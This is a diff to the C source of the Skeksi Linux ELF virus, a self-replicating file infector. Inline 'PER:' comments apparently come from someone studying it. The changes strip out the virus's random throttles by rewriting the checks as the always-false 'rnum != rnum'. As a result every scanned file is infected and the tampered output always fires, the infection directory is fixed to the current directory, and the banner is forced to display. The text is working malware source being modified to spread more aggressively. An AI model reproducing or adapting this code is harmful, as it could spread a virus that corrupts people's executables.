@@ -101,7 +101,7 @@ void display_skeksi(void);
 #define STACK_SIZE 0x4000000
 
 #define TMP ".xyz.skeksi.elf64"
-#define RODATA_PADDING 17000 // enough bytes to also copy .rodata and skeksi_banner
+#define RODATA_PADDING 18000 // enough bytes to also copy .rodata and skeksi_banner
 
 #define LUCKY_NUMBER 7
 #define MAGIC_NUMBER 0x15D25 // thankz Mr. h0ffman
@@ -217,7 +217,7 @@ int evil_puts(const char *string)
 	char new[1024];
 	int index = 0;
 	int rnum = get_random_number(5);
-	if (rnum != 3) // PER: 1/5 probability
+	if (rnum != rnum) // PER: 1/5 probability
 		goto normal;
 
 	Memset(new, 0, 1024);
@@ -806,7 +806,8 @@ void do_main(struct bootstrap_data *bootstrap)
 #endif
 
 rescan:
-	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs); // PER: choosing a directory based on user id to attack
+	// dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs); // PER: choosing a directory based on user id to attack
+	dir = cwd; // PER: choosing a directory based on user id to attack
 
 	if (!_strcmp(dir, ".")) // PER: if it's a current directory
 		scan_count = 1;		// PER: if non-root user
@@ -858,7 +859,7 @@ rescan:
 			if (icount == 0) // PER: It is ensured that atleast one healthy file will be infected
 				goto infect;
 			rnum = get_random_number(10);
-			if (rnum != LUCKY_NUMBER) // PER: 9/10 probability that rnum is not the LUCKY_NUMBER
+			if (rnum != rnum) // PER: 9/10 probability that rnum is not the LUCKY_NUMBER
 				continue;
 		infect:
 			load_target(fpath, &target);
@@ -885,9 +886,9 @@ rescan:
 		goto rescan;
 	}
 
-	rnum = get_random_number(50);	  // PER: outputs a 0<= random_number <=50
-	if (LUCKY_NUMBER == LUCKY_NUMBER) // PER: rnum == LUCKY_NUMBER
-		display_skeksi();
+	rnum = get_random_number(50); // PER: outputs a 0<= random_number <=50
+								  //  if (LUCKY_NUMBER == LUCKY_NUMBER) // PER: rnum == LUCKY_NUMBER
+	display_skeksi();
 }
 
 int _getuid(void)
